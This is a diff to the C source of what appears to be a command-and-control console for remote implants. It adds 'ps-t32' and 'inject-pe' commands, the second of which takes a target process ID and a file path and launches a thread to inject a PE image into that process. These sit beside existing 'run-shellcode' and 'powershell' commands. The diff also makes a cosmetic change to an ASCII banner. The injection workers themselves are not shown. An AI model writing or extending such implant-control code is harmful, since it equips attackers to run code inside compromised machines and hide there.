@@ -173,7 +173,7 @@ int _handle_fetch() {
 			"   #######           &    &&    &&                           &  &    &&                      &      \n"
 			"   #######           &    &     &&      &&&&     &&&&    &&& &  &     &     &      &&&&      &      \n"
 			"   #######           && &&&     &&     &    &  &     &  &    &#####   &     &     &    &     &      \n"
-			"    #######          &    &&    &&    &&&&&&& &&&&&&&& ########    ######## &      &&&&&     &      \n"
+			"    #######          &    &&    &&    &&&&&&& &&&&&&&& ######## &  ######## &      &&&&&     &      \n"
 			"    #####            &    &&    &&     &       &    ######   &  &     &   ########&    &     &      \n"
 			"     ###             &&&&&&     &&     &&&&&   ######     &&&&  &&&&&&      &     ######     &      \n"
 			"      ####                                  ####                                      ########      \n"
@@ -505,6 +505,58 @@ int _handle_run_shellcode(char* user_input,
 	return 0;
 }
 
+int _handle_pst32(char* user_input,
+	char** tok_ctx_ptr,
+	struct cli_info_t* cli_info,
+	struct bleeddial_ctx_t* ctx) {
+
+	struct pst32_params_t* params;
+	params = calloc(1, sizeof(*params));
+	if (params == 0) return -1;
+
+	params->ctx = ctx;
+	params->endpoint_id = cli_info->endpoint_id;
+
+	CreateThread(NULL, 0, thread_pst32, params, 0, 0);
+
+	return 0;
+}
+
+int _handle_injectpe(char* user_input,
+	char** tok_ctx_ptr,
+	struct cli_info_t* cli_info,
+	struct bleeddial_ctx_t* ctx) {
+
+	char path[255];
+
+	char* tok;
+	char* file_name_ptr;
+	char* context = NULL;
+	uint32_t pid;
+
+	tok = strtok_s(*tok_ctx_ptr, " ", &context);
+	pid = (uint32_t)strtol(tok, &context, 10);
+	context++;
+
+	tok = strtok_s(NULL, " \n", &context);
+	strncpy_s(path, 255, tok, _TRUNCATE);
+
+	struct inject_params_t* params;
+	params = calloc(1, sizeof(*params));
+	if (params == 0) return -1;
+
+	params->ctx = ctx;
+	params->endpoint_id = cli_info->endpoint_id;
+
+	params->target_pid = pid;
+	strncpy_s(params->local_path, 255, path, _TRUNCATE);
+	params->local_path_len = strlen(path);
+	
+	CreateThread(NULL, 0, thread_inject, params, 0, 0);
+
+	return 0;
+}
+
 int _handle_user_input(char* user_input, 
 					   size_t user_input_len, 
 					   struct cli_info_t* cli_info,
@@ -560,6 +612,12 @@ int _handle_user_input(char* user_input,
 		}
 		if (strncmp(first_word, "run-shellcode", 11) == 0) {
 			return _handle_run_shellcode(user_input, &tok_ctx, cli_info, ctx);
+		}
+		if (strncmp(first_word, "ps-t32", 6) == 0) {
+			return _handle_pst32(user_input, &tok_ctx, cli_info, ctx);
+		}
+		if (strncmp(first_word, "inject-pe", 9) == 0) {
+			return _handle_injectpe(user_input, &tok_ctx, cli_info, ctx);
 		}
 		if (strncmp(first_word, "powershell", 10) == 0) {
 			struct powershell_params_t* p = calloc(1, sizeof(*p));
